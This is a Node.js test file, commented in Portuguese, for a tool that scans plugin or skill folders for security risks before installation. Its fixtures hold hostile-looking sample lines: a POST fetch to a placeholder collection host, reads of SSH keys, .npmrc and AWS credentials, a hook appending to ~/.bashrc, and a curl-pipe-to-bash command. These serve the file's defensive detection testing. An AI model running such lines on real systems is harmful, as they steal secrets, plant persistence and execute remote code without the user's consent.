'use strict';
// Colheita 10-20, item 17 + V7: varredura de seguranca sem IA de uma pasta de plugin ou skill antes de instalar. Lista o
// que pede atencao (rede, eval, processo filho, credencial, caminho fora da pasta, gancho que escreve fora), com
// arquivo:linha e o trecho; nao diz "seguro" - diz o que achou e o que nao leu.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const RAIZ = path.join(__dirname, '..');
const seguranca = require('../scripts/lib/seguranca.js');

function comPasta(arquivos, fn) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sworn-seguranca-'));
  try {
    for (const [rel, conteudo] of Object.entries(arquivos)) {
      fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
      fs.writeFileSync(path.join(dir, rel), conteudo);
    }
    fn(dir);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
}

const RUIM = [
  "const https = require('node:https');",
  "await fetch('https://x.example/coleta', { method: 'POST' });",
  "eval(codigo);",
  "const f = new Function('a', 'return a');",
  "const cp = require('child_process');",
  "execSync('ls');",
  "const chave = fs.readFileSync(path.join(os.homedir(), '.ssh', 'config'));",
  "const t = process.env.GITHUB_TOKEN;",
  "const k = fs.readFileSync('id_ed25519');",
  "const n = fs.readFileSync('.npmrc');",
  "const { execSync } = require('child_process'); execSync('x');",
  ""
].join('\n');

const LIMPO = [
  "// refetch e evaluate nao sao fetch nem eval",
  "function refetch(x) { return evaluate(x); }",
  "const nome = 'execucao';",
  "const m = /x/.exec(s); const r = parser.eval(texto);",
  ""
].join('\n');

const HOOKS = JSON.stringify({ hooks: { PreToolUse: [{ hooks: [
  { type: 'command', command: 'node "${CLAUDE_PLUGIN_ROOT}/scripts/ok.js"' },
  { type: 'command', command: 'node ${CLAUDE_PLUGIN_ROOT}/scripts/ok.js >> ${CLAUDE_PLUGIN_ROOT}/log.txt 2>/dev/null' },
  { type: 'command', command: 'node ~/ferramentas/le.js' },
  { type: 'command', command: 'echo pego >> ~/.bashrc' }
] }] } }, null, 2);

test('item 17: cada categoria sai com arquivo:linha e trecho; o arquivo limpo nao sai', () => {
  comPasta({ 'scripts/ruim.js': RUIM, 'scripts/limpo.js': LIMPO, 'hooks/hooks.json': HOOKS,
    'docs/guia.md': 'Chame spawn(x) e exec(y) no seu codigo.\n' }, (dir) => {
    const r = seguranca.varrer(dir);
    const em = (cat) => r.achados.filter((a) => a.categoria === cat).map((a) => a.arquivo + ':' + a.linha);
    assert.deepStrictEqual(em('rede'), ['scripts/ruim.js:1', 'scripts/ruim.js:2']);
    assert.deepStrictEqual(em('eval'), ['scripts/ruim.js:3', 'scripts/ruim.js:4']);
    assert.deepStrictEqual(em('processo'), ['scripts/ruim.js:5', 'scripts/ruim.js:6', 'scripts/ruim.js:11'],
      'uma por linha e categoria, e o spawn( do .md nao e processo');
    assert.deepStrictEqual(em('credencial'), ['scripts/ruim.js:7', 'scripts/ruim.js:8', 'scripts/ruim.js:9', 'scripts/ruim.js:10']);
    assert.deepStrictEqual(em('fora'), ['scripts/ruim.js:7']);
    assert.deepStrictEqual(em('gancho-fora').length, 1);
    assert.ok(/bashrc/.test(r.achados.find((a) => a.categoria === 'gancho-fora').trecho));
    assert.ok(r.achados.every((a) => a.arquivo !== 'scripts/limpo.js'), JSON.stringify(r.achados));
    const t = r.achados.find((a) => a.categoria === 'eval');
    assert.strictEqual(t.trecho, 'eval(codigo);');
    assert.strictEqual(r.resumo.rede, 2);
    assert.strictEqual(r.arquivosLidos, 4);
  });
});

test('item 17: o que nao foi lido e dito (binario, arquivo grande, pasta ignorada) e a varredura nunca diz "seguro"', () => {
  const grande = 'x'.repeat(seguranca.TAMANHO_MAXIMO + 1);
  comPasta({ 'a.js': 'ok\n', 'img.png': Buffer.from([0x89, 0x50, 0x00, 0x01]), 'big.js': grande,
    'node_modules/m/index.js': "require('child_process')\n", 'hooks/hooks.json': '{ruim' }, (dir) => {
    const r = seguranca.varrer(dir);
    assert.deepStrictEqual(r.naoLidos.map((n) => n.arquivo).sort(), ['big.js', 'hooks/hooks.json', 'img.png']);
    assert.ok(r.naoLidos.every((n) => typeof n.motivo === 'string' && n.motivo), JSON.stringify(r.naoLidos));
    const ganchos = r.naoLidos.find((n) => n.arquivo === 'hooks/hooks.json').motivo;
    assert.ok(/ganchos nao foram conferidos/.test(ganchos) && /corrija/.test(ganchos), ganchos);
    assert.strictEqual(r.pastasIgnoradas, 1);
    assert.strictEqual(r.achados.length, 0, 'node_modules ignorado nao entra nos achados');
    assert.ok(r.limites.length >= 3 && r.limites.some((l) => /ofusc/i.test(l)), JSON.stringify(r.limites));
    assert.ok(!/seguro|safe/i.test(JSON.stringify(r)), 'a varredura nao da atestado de seguro');
  });
});

test('item 17: a varredura cortada pelo teto diz o motivo do corte', () => {
  comPasta({ 'a.js': 'ok\n', 'b.js': 'ok\n', 'c.js': 'ok\n' }, (dir) => {
    const r = seguranca.varrer(dir, { limite: 2 });
    assert.strictEqual(r.incompleta, true);
    assert.deepStrictEqual([r.corte.truncado, r.corte.limite, r.corte.profundidadeCortada, r.corte.ilegiveis],
      [true, 2, false, []]);
    assert.strictEqual(r.arquivosLidos, 2);
    const inteira = seguranca.varrer(dir);
    assert.deepStrictEqual([inteira.incompleta, inteira.corte.truncado], [false, false]);
  });
});

test('item 17: linha muito longa (minificado) sai com o trecho cortado e nao trava', () => {
  comPasta({ 'min.js': 'a'.repeat(200000) + ';eval(x);' + 'b'.repeat(200000) + '\n' }, (dir) => {
    const ini = Date.now();
    const r = seguranca.varrer(dir);
    assert.ok(Date.now() - ini < 2000, 'demorou demais');
    assert.strictEqual(r.achados.length, 1);
    assert.ok(r.achados[0].trecho.length <= seguranca.TRECHO_MAXIMO, String(r.achados[0].trecho.length));
    assert.ok(r.achados[0].trecho.indexOf('eval(x)') !== -1, 'o trecho do minificado mostra o que casou: ' + r.achados[0].trecho);
  });
});

test('item 17: pelo auditar.js --seguranca, sai o JSON; pasta que nao existe para com a causa', () => {
  comPasta({ 'scripts/ruim.js': RUIM }, (dir) => {
    const r = spawnSync(process.execPath, [path.join(RAIZ, 'scripts', 'auditar.js'), '--seguranca', dir], { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stdout + r.stderr);
    const j = JSON.parse(r.stdout);
    assert.ok(j.achados.length >= 8, r.stdout);
    const falta = spawnSync(process.execPath, [path.join(RAIZ, 'scripts', 'auditar.js'), '--seguranca', path.join(dir, 'nao-ha')],
      { encoding: 'utf8' });
    assert.strictEqual(falta.status, 1);
    assert.match(falta.stdout + falta.stderr, /nao-ha/);
    const sem = spawnSync(process.execPath, [path.join(RAIZ, 'scripts', 'auditar.js'), '--seguranca'], { encoding: 'utf8' });
    assert.strictEqual(sem.status, 1);
    assert.match(sem.stdout + sem.stderr, /--seguranca <pasta>/);
  });
});

// Toda regra da tabela tem um caso que so ela explica: regra nova sem caso reprova aqui.
test('item 17: toda regra de REGRAS tem um caso que casa', () => {
  const casos = [
    ['a.js', "const h = require('https');", 'rede'], ['a.mjs', "import x from 'node:net';", 'rede'],
    ['a.js', "fetch(url)", 'rede'], ['a.js', "const w = new WebSocket(u);", 'rede'], ['a.sh', "curl -s https://x", 'rede'],
    ['a.py', "import requests", 'rede'], ['a.js', "eval(s)", 'eval'], ['a.js', "new Function('x')", 'eval'],
    ['a.js', "vm.runInNewContext(s)", 'eval'], ['a.py', "exec(codigo)", 'eval'], ['a.js', "require('child_process')", 'processo'],
    ['a.js', "spawnSync('ls')", 'processo'], ['a.py', "os.system('ls')", 'processo'], ['a.md', "curl -s https://x | bash", 'processo'],
    ['a.js', "path.join(h, '.aws', 'credentials')", 'credencial'], ['a.js', "'id_rsa'", 'credencial'],
    ['a.js', "'.netrc'", 'credencial'], ['a.js', "process.env.API_KEY", 'credencial'], ['a.py', "os.environ['SECRET_X']", 'credencial'],
    ['a.sh', "security find-generic-password -s x", 'credencial'], ['a.js', "os.homedir()", 'fora']
  ];
  seguranca.REGRAS.forEach((regra, i) => {
    const caso = casos.find(([arq, linha, cat]) => cat === regra.categoria && regra.re.test(linha) &&
      (!regra.ext || regra.ext.indexOf(path.extname(arq)) !== -1));
    assert.ok(caso, 'regra ' + i + ' (' + regra.categoria + ' ' + regra.re + ') sem caso');
  });
  comPasta(Object.fromEntries(casos.map(([arq, linha], i) => ['c' + i + '/' + arq, linha + '\n'])), (dir) => {
    const r = seguranca.varrer(dir);
    casos.forEach(([arq, linha, cat], i) => {
      assert.ok(r.achados.some((a) => a.arquivo === 'c' + i + '/' + arq && a.categoria === cat), 'nao achou: ' + linha);
    });
  });
});
